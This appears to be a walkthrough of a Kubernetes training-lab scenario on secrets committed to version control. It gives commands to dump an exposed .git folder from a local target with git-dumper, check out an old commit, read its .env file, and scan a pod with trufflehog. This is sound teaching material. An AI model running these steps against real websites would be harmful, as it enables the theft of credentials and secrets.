# Sensitive keys in codebases

## Scenario Information

Developers tend to commit sensitive information to version control systems. As we are moving towards CI/CD and GitOps systems, we tend to forgot to identify sensitive information in code and commits. Let's see if we can find something cool here!

* To get started with the scenario, navigate to [http://127.0.0.1:1230](http://127.0.0.1:1230)

![Scenario 1 Entry](images/sc-1-1.png)

## Scenario Solution

### Method 1

After reading the scenario description and application information. We have performed some discovery and analysis, then identified that it has `.git` folder exposed within the application.

![Scenario 1 Git folder found](images/sc-1-2.png)

* Clone the git repository locally by running the following command. Ensure you have set up [git-dumper](https://github.com/arthaud/git-dumper) locally before running the below command

```bash
python3 git-dumper.py http://localhost:1230/.git k8s-goat-git
```

![Scenario 1 git-dumper clone locally](images/sc-1-3.png)

* Now check the git log information

```bash
cd k8s-goat-git
git log
```

![Scenario 1 Git log history](images/sc-1-4.png)

* Checkout an old commit for a specific version

```bash
git checkout 128029d89797957957b2a7198d8d159b239b34eb
ls -la
cat .env
```

![Scenario 1 Gain access to flag](images/sc-1-5.png)

### Method 2

Sometimes, we ideally have access to the pods or containers access and we can also perform analysis from within the container as well.

```bash
export POD_NAME=$(kubectl get pods --namespace default -l "app=build-code" -o jsonpath="{.items[0].metadata.name}")
kubectl exec -it $POD_NAME -- sh
```

![Scenario 1 access to pod](images/sc-1_1.png)

* Then we can perform analysis on `.git` folder by running utilities like trufflehog

```bash
trufflehog .
```

![Scenario 1 trufflehog discovery](image/../images/sc-1_2.png)

## Miscellaneous

TBD
